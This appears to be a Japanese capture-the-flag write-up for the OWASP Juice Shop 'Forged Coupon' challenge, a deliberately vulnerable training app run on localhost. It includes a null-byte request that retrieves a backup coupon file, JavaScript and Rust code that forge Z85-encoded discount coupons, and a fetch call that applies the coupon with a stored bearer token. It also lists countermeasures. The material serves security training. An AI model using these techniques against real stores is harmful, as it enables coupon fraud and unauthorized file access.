# Forged Coupon ✅

**難易度:** ⭐⭐⭐⭐⭐⭐
**カテゴリ:** Cryptographic Issues
**目標:** 有効なクーポンコードを偽造して80%以上の割引を得る

## 思考プロセス

1. `/ftp/coupons_2013.md.bak` から過去のクーポンを取得
2. クーポンコードが Z85 エンコードされていることを発見
3. デコードすると `MMMYY-VV` 形式（月年-割引率）
4. 現在の日付で80%以上の割引クーポンを Z85 エンコード
5. チェックアウト時に適用

## 実行手順

### Step 1: 過去のクーポンを取得

```bash
curl "http://localhost:3000/ftp/coupons_2013.md.bak%2500.md"
```

**結果:**
```
n<MibgC7sn  → JAN13-10 (2013年1月、10%オフ)
mNYS#gC7sn  → FEB13-10
o*IVigC7sn  → MAR13-10
k#pDlgC7sn  → APR13-10
l}6D$gC7ss  → DEC13-15 (15%オフ)
```

### Step 2: Z85 エンコード形式を理解

```
クーポン形式: MMMYY-VV
- MMM = 月（JAN, FEB, MAR, ...）
- YY = 年（13, 26, ...）
- VV = 割引率（10, 50, 80, 90）

Z85 は 4バイト → 5文字 のエンコーディング
8文字のクーポン → 10文字の Z85 コード
```

### Step 3: 偽造クーポンを生成

**実際に使用したコード:**

```javascript
// ブラウザコンソールで実行
(() => {
  const z85alphabet = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-:+=^!/*?&<>()[]{}@%$#";

  function z85encode(str) {
    // 4の倍数になるようパディング
    while (str.length % 4 !== 0) {
      str += '\0';
    }

    let result = '';
    for (let i = 0; i < str.length; i += 4) {
      let value = 0;
      for (let j = 0; j < 4; j++) {
        value = value * 256 + str.charCodeAt(i + j);
      }

      let encoded = '';
      for (let j = 0; j < 5; j++) {
        encoded = z85alphabet[value % 85] + encoded;
        value = Math.floor(value / 85);
      }
      result += encoded;
    }
    return result;
  }

  // 2026年1月、80%オフ
  const coupon = "JAN26-80";
  const encoded = z85encode(coupon);
  console.log(`Coupon: ${coupon} → Z85: ${encoded}`);
  return encoded;
})();
// 結果: n<Michz3)x
```

**生成されたクーポン:** `n<Michz3)x` (JAN26-80 = 80%オフ)
```

### Step 4: クーポンを適用

```javascript
browser_evaluate(() => {
  const token = localStorage.getItem('token');
  const basketId = sessionStorage.getItem('bid');
  const couponCode = 'ここにZ85エンコードされたコード';

  return fetch(`/rest/basket/${basketId}/coupon/${couponCode}`, {
    method: 'PUT',
    headers: { 'Authorization': 'Bearer ' + token }
  }).then(r => r.json());
});
```

## 解説

### Z85 エンコーディングとは

- ZeroMQ で使用される Base85 の変種
- バイナリデータを ASCII 文字に変換
- 4バイト → 5文字（20%のオーバーヘッド）
- 使用文字: `0-9`, `a-z`, `A-Z`, `.-:+=^!/*?&<>()[]{}@%$#`

### なぜ脆弱か

1. **弱い暗号化**: Z85 は暗号化ではなくエンコーディング
2. **予測可能な形式**: クーポン形式が固定 (`MMMYY-VV`)
3. **サーバー側検証の欠如**: 任意のクーポンが生成可能

### 攻撃の成功条件

- 過去のクーポンサンプルを入手（Poison Null Byte で FTP からアクセス）
- エンコーディング形式を特定（Z85）
- クーポンフォーマットを解読（`MMMYY-VV`）

### 対策

1. **暗号化署名**: クーポンに HMAC 署名を付与
2. **サーバー側検証**: 発行済みクーポンのみをDBで管理
3. **レート制限**: クーポン試行回数を制限
4. **監査ログ**: 異常なクーポン使用を検知

## Rust での実装

```rust
use z85;

fn generate_coupon(month: &str, year: &str, discount: u8) -> String {
    let coupon = format!("{}{}-{:02}", month, year, discount);
    let padded = format!("{:\0<8}", coupon);
    z85::encode(padded.as_bytes())
}

fn main() {
    let code = generate_coupon("JAN", "26", 90);
    println!("Forged coupon: {}", code);
}
```

## 関連チャレンジ

- [Poison Null Byte](../difficulty-4/poison-null-byte.md) - クーポンファイルの取得
- [Expired Coupon](../difficulty-4/expired-coupon.md) - 期限切れクーポンの使用

## 参考リンク

- [Z85 Encoding](https://rfc.zeromq.org/spec/32/)
- [OWASP Cryptographic Failures](https://owasp.org/Top10/A02_2021-Cryptographic_Failures/)
